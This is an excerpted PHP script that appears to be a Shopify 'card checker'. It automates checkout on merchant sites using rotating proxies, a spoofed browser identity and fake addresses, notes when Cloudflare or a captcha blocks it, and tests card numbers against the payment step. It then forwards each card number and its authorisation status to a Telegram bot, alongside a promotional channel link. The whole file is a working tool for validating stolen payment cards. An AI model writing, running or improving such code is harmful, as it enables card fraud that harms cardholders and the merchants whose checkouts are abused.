...
$proxy_param = $_GET['proxy'] ?? '';

if (!empty($proxy_param)) {
    $proxy_parts = explode(":", $proxy_param);
    if (count($proxy_parts) === 4) {
        $existing = file_exists("proxies.txt") ? file("proxies.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
        if (!in_array($proxy_param, $existing)) {
            file_put_contents("proxies.txt", $proxy_param . PHP_EOL, FILE_APPEND);
        }
    }
}
$use_proxy = false;
...
function generateUSAddress() {
    $statesWithZipRanges = ["AL" => ["Alabama", [35000, 36999]],"AK" => ["Alaska", [99500, 99999]],"AZ" => ["Arizona", [85000, 86999]],"AR" => ["Arkansas", [71600, 72999]],"CA" => ["California", [90000, 96199]],"CO" => ["Colorado", [80000, 81999]],"CT" => ["Connecticut", [6000, 6999]],"DE" => ["Delaware", [19700, 19999]],"FL" => ["Florida", [32000, 34999]],"GA" => ["Georgia", [30000, 31999]],"OK" => ["Oklahoma", [73000, 74999]],];
    ...
    return ['street' => "$streetNumber $streetName",'city' => $city,'state' => $stateCode,'stateName' => $stateName,'postcode' => str_pad($zipCode, 5, "0", STR_PAD_LEFT),'country' => "US"];
}
...
function getMinimumPriceProductDetails(string $json): array {
    ...
    if (!is_array($data) || !isset($data['products'])) throw new Exception('Invalid JSON format or missing products key');
    $minPrice = null;
        ...
        foreach ($product['variants'] as $variant) {
            ...
            if ($price >= 0.01) {
                if ($minPrice === null || $price < $minPrice) {
                    $minPrice = $price;
                    $minPriceDetails = ['id' => $variant['id'], 'price' => $variant['price'], 'title' => $product['title']];
                }
            }
        }
    }
    if ($minPrice === null) throw new Exception('Site Not Supported (Products Not Found)');
...
file_put_contents("shopify_sites.txt", $site1);
...
curl_setopt($ch, CURLOPT_HTTPHEADER, ['User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36','Accept: application/json',]);

$r1 = curl_exec($ch);
if ($r1 === false) {
    $curlError = curl_error($ch);
    curl_close($ch);
    if (strpos($curlError, 'getaddrinfo') !== false || strpos($curlError, 'resolve') !== false || strpos($curlError, 'timed out') !== false) {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            sleep(4);
            goto start;
        } else {
            echo json_encode(['Response' => 'DNS resolution failed after multiple attempts']);
            exit;
        }
    } else {
        echo json_encode(['Response' => 'Error in 1st req: ' . $curlError]);
        exit;
    }
} else {
    curl_close($ch);
    if (strpos($r1, '<!DOCTYPE html>') !== false || strpos($r1, '503 Service Unavailable') !== false) {
        echo json_encode(['Response' => 'API returned invalid JSON: Site unavailable']);
        exit;
    }
    try {
...
if (empty($minPriceProductId)) {
    echo json_encode(['Response' => 'PRODUCT ID EMPTY']);
    exit;
}
...
curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $headerLine) use (&$headers) {
    ...
    $name = trim($name);
    if (strtolower($name) === 'location') $headers['Location'] = $value;
...
if (curl_errno($ch)) {
    ...
    echo json_encode(['Response' => 'Error in 1st Req => ' . $curlError, 'Price' => $minPrice]);
    exit;
}

$finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
$keywords = ['stock_problems','Some items in your cart are no longer available. Please update your cart.','This product is currently unavailable.','This item is currently out of stock but will be shipped once available.','Sold Out.','stock-problems'];
$found = false;
foreach ($keywords as $keyword) if (strpos($response, $keyword) !== false) $found = true;

if ($found) {
    echo json_encode(['Response' => "Item is out of stock",'Price' => $minPrice]);
    exit;
}
...
if (empty($x_checkout_one_session_token)) {
    if ($retryCount < $maxRetries) {
        ...
        echo json_encode(['Response' => "CLOUDFLARE DETECTED 🚫",'Price'=> $minPrice]);
        exit;
    }
}
...
if (empty($queue_token)) {
    if ($retryCount < $maxRetries) {
        ...
        echo json_encode(['Response' => 'TOKEN EMPTY','Price'=> $minPrice]);
        exit;
    }
}
...
if (empty($stable_id)) {
    if ($retryCount < $maxRetries) {
        ...
        echo json_encode(['Response' => 'ID EMPTY','Price'=> $minPrice]);
        exit;
    }
}
...
if (empty($paymentMethodIdentifier)) {
    if ($retryCount < $maxRetries) {
        ...
        echo json_encode(['Response' => 'PAYMENTMETHODIDENTIFIER EMPTY','Price'=> $minPrice]);
        exit;
    }
}
...
$checkoutToken = '';
if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) $checkoutToken = $matches[1];

$randomCoordinates = generateRandomCoordinates();
$latitude = $randomCoordinates['latitude'];
$longitude = $randomCoordinates['longitude'];

if (strpos($site1, '.us')) $address = ['street' => '11n lane avenue south','city' => 'Jacksonville','state' => 'FL','postcode' => '32210','country' => $countrycode,'currency' => $currency];
elseif (strpos($site1, '.uk')) $address = ['street' => '11N Mary Slessor Square','city' => 'Dundee','state' => 'SCT','postcode' => 'DD4 6BW','country' => $countrycode,'currency' => $currency];
elseif (strpos($site1, '.in')) $address = ['street' => 'bhagirathpura indore','city' => 'indore','state' => 'MP','postcode' => '452003','country' => $countrycode,'currency' => $currency];
elseif (strpos($site1, '.ca')) $address = ['street' => '11n Lane Street','city' => "Barry's Bay",'state' => 'ON','postcode' => 'K0J 2M0','country' => $countrycode,'currency' => $currency];
elseif (strpos($site1, '.au')) $address = ['street' => '94 Swanston Street','city' => 'Wingham','state' => 'NSW','postcode' => '2429','country' => $countrycode,'currency' => $currency];
else $address = ['street' => '11n lane avenue south','city' => 'Jacksonville','state' => 'FL','postcode' => '32210','country' => 'US','currency' => 'USD'];
...
curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 300);
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['accept: application/json','accept-language: en-US,en;q=0.9','content-type: application/json','origin: https://checkout.shopifycs.com','priority: u=1, i','referer: https://checkout.shopifycs.com/','sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"','sec-ch-ua-mobile: ?0','sec-ch-ua-platform: "Windows"','sec-fetch-dest: empty','sec-fetch-mode: cors','sec-fetch-site: same-site','user-agent: '.$ua,]);
...
if (curl_errno($ch)) {
    ...
    echo json_encode(['Response' => 'cURL error: ' . $curlError,'Price'=> $minPrice]);
    exit;
}
...
if (empty($cctoken)) {
    if ($retryCount < $maxRetries) {
        ...
        echo json_encode(['Response' => 'TOKEN ID EMPTY','Price'=> $minPrice]);
        exit;
    }
}
...
if (isset($decoded->data->session->negotiate->result->sellerProposal)) {
    ...
    if (empty($firstStrategy)) {
        ...
        $err = 'Site Not Supported (Receipt ID Not Found)';
        $result = json_encode([
            'Response' => $err,
            'Status' => 'true',
            'Price'=> $minPrice,
...
if (strpos($response4, '"errors":[{"code":"CAPTCHA_METADATA_MISSING"')) {
    $err = "CAPTCHA DETECTED (CHANGE SITE)";
    $result = json_encode([
        'Response' => $err,
        'Status' => 'false',
        'Price'=> $totalamt,
...
function sendTG($chatId, $botToken, $msg) {
    $keyboard = [
        "inline_keyboard" => [
            [
                ["text" => "Join Channel 🔥", "url" => "https://t.me/erovixcasanova"]
            ]
        ]
    ];
    $post = [
...
if (
    ...
    $msg = "<b>💳 CC:</b> <code>$cc1</code>\n<b>Status:</b> 🔐 3D_AUTHENTICATION\n<b>Gateway:</b> $gateway\n<b>Price:</b> $totalamt";
    sendTG($chatId, $botToken, $msg);

    echo json_encode([
        'Response' => '3D_AUTHENTICATION',
        'Status'   => 'true',
        'Price'    => $totalamt,
        'Gateway'  => $gateway
    ], JSON_UNESCAPED_SLASHES);
